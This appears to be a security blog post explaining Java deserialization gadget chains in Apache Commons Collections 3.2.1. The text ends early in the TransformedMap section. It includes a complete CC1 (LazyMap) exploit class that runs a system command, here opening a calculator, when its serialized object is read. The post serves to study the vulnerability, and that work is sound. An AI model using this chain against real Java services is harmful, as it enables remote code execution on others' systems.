<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Commons-Collections-ExploitIntroduction“Apache Commons” is a project of the Apache Software Foundation and it is also a popular program to study Java Deserialization Vulnerabilities. Let’s talk about">
<meta property="og:type" content="article">
<meta property="og:title" content="Commons Collections Exploit">
<meta property="og:url" content="http://example.com/2023/07/11/Commons-Collections-Exploit/index.html">
<meta property="og:site_name" content="P3ngu1nW">
<meta property="og:description" content="Commons-Collections-ExploitIntroduction“Apache Commons” is a project of the Apache Software Foundation and it is also a popular program to study Java Deserialization Vulnerabilities. Let’s talk about">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230711203030569.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230711211345900.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230711211609817.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230711213106433.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712084245881.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712090631756.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712093041403.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712103248923.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712103555989.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712113434284.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712111148168.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712143000159.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712143351984.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712145309352.png">
<meta property="og:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230712145422130.png">
<meta property="article:published_time" content="2023-07-11T08:56:59.000Z">
<meta property="article:modified_time" content="2023-07-24T14:32:21.751Z">
<meta property="article:author" content="P3ngu1nW">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/07/11/Commons-Collections-Exploit/image-20230711203030569.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Commons Collections Exploit</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/07/13/Tomcat-Architecture/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/06/UIUCTF2023-WEB-WP/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/11/Commons-Collections-Exploit/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&text=Commons Collections Exploit"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&is_video=false&description=Commons Collections Exploit"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Commons Collections Exploit&body=Check out this article: http://example.com/2023/07/11/Commons-Collections-Exploit/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&name=Commons Collections Exploit&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/11/Commons-Collections-Exploit/&t=Commons Collections Exploit"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Commons-Collections-Exploit"><span class="toc-number">1.</span> <span class="toc-text">Commons-Collections-Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1-Lazy-Map"><span class="toc-number">1.2.</span> <span class="toc-text">CC1(Lazy Map)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV"><span class="toc-number">1.2.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain"><span class="toc-number">1.2.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#InvokerTransformer"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ChainedTransformer"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">ChainedTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ConstantTransformer"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">ConstantTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATCH"><span class="toc-number">1.2.4.</span> <span class="toc-text">PATCH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1-Transformed-Map"><span class="toc-number">1.3.</span> <span class="toc-text">CC1(Transformed Map)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Env"><span class="toc-number">1.3.1.</span> <span class="toc-text">Env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformedMap"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">TransformedMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AbstractInputCheckedMapDecorator"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">AbstractInputCheckedMapDecorator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler-1"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATCH-1"><span class="toc-number">1.3.4.</span> <span class="toc-text">PATCH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">1.4.</span> <span class="toc-text">CC6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">HashMap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.4.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC3"><span class="toc-number">1.5.</span> <span class="toc-text">CC3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-3"><span class="toc-number">1.5.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TrAXFilter"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">TrAXFilter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InstantiateTransformer"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">InstantiateTransformer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">1.5.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2-amp-amp-CC4"><span class="toc-number">1.6.</span> <span class="toc-text">CC2&amp;&amp;CC4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-3"><span class="toc-number">1.6.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-4"><span class="toc-number">1.6.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformingComparator"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">TransformingComparator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PriorityQueue"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">PriorityQueue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-CC2"><span class="toc-number">1.6.3.</span> <span class="toc-text">EXP(CC2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATCH-2"><span class="toc-number">1.6.4.</span> <span class="toc-text">PATCH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5"><span class="toc-number">1.7.</span> <span class="toc-text">CC5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-5"><span class="toc-number">1.7.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-1"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-4"><span class="toc-number">1.7.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7"><span class="toc-number">1.8.</span> <span class="toc-text">CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-5"><span class="toc-number">1.8.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-6"><span class="toc-number">1.8.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashtable-amp-amp-AbstractMapDecorator"><span class="toc-number">1.8.2.1.</span> <span class="toc-text">Hashtable &amp;&amp; AbstractMapDecorator</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-5"><span class="toc-number">1.8.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC11"><span class="toc-number">1.9.</span> <span class="toc-text">CC11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-6"><span class="toc-number">1.9.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-7"><span class="toc-number">1.9.2.</span> <span class="toc-text">Gadget Chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-6"><span class="toc-number">1.9.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Commons Collections Exploit
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">P3ngu1nW</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-07-11T08:56:59.000Z" class="dt-published" itemprop="datePublished">2023-07-11</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Commons-Collections-Exploit"><a href="#Commons-Collections-Exploit" class="headerlink" title="Commons-Collections-Exploit"></a>Commons-Collections-Exploit</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>“Apache Commons” is a project of the Apache Software Foundation and it is also a popular program to study Java Deserialization Vulnerabilities.</p>
<p>Let’s talk about some classical CC gadget chains to have a general understanding in this kind of vulnerabilities.</p>
<h2 id="CC1-Lazy-Map"><a href="#CC1-Lazy-Map" class="headerlink" title="CC1(Lazy Map)"></a>CC1(Lazy Map)</h2><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><ul>
<li>JDK8u65</li>
<li>Commons-collections 3.2.1</li>
</ul>
<h3 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>In <code>InvokerTransformer#transform</code>, there exists a dangerous code block, which might execute any command by the reflection.</p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230711203030569.png" class title="image-20230711203030569">

<p>Then, let’s find out which methods can trigger it.</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>In <code>ChainedTransformer#transform</code>, we can call the method successively so that we can execute a serious of commands. Besides, this class can release our coding trouble as we needn’t to new a InvokerTransformer class one by another and call its transform method.</p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230711211345900.png" class title="image-20230711211345900">

<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>It’s an easy class, we can use this class as the first element in the ChainedTransformer so that we can ignore the argument in <code>ChainedTransformer#transforms</code></p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230711211609817.png" class title="image-20230711211609817">

<p>Till now, we have a demo to RCE.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">            )</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> ChainedTransformer.getInstance(transformers);</span><br><span class="line">    chainedTransformer.transform(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>But how to exploit it from the java deserialize function:  <code>readobject()</code></p>
<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>In <code>Lazymap#get</code>, we can control the variable <code>factory</code> and call the transformer. Thanks to the <code>ConstantTransformer</code>, we needn’t to control the variable <code>key</code>.</p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230711213106433.png" class title="image-20230711213106433">

<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>That’s the last puzzle to solve our question.</p>
<p>In <code>AnnotationInvocationHandler#invoke</code>, we have an available code block:<code>Object result = memberValues.get(member);</code> and the variable <code>memberValues</code> is controllable.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        ....</span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">				.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Besides, in this class’s readObject function, the <code>memberValues.entrySet()</code> is called.</p>
<p>That means, if we set the <code>memberValues</code> as a DYNAMIC PROXY CLASS, it will call <code>memberValues.invoke()</code>, and the full chain has been constructed.</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">            )</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> ChainedTransformer.getInstance(transformers);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">mp</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), chainedTransformer);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">C</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> C.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, mp);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(HashMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">    invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">    serialize(invocationHandler);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h3><p>In jdk8u71, <code>AnnotationInvocationHandler</code> will use <code>readFields</code> to get the specific property, not the <code>defaultReadObject</code> way.</p>
<h2 id="CC1-Transformed-Map"><a href="#CC1-Transformed-Map" class="headerlink" title="CC1(Transformed Map)"></a>CC1(Transformed Map)</h2><h3 id="Env"><a href="#Env" class="headerlink" title="Env"></a>Env</h3><ul>
<li>JDK8u65</li>
<li>Commons-collections 3.2.1</li>
</ul>
<h3 id="Gadget-Chain-1"><a href="#Gadget-Chain-1" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>Like the chain constructed by LazyMap, we can find another way to call the <code>transform()</code> method.</p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712084245881.png" class title="image-20230712084245881">

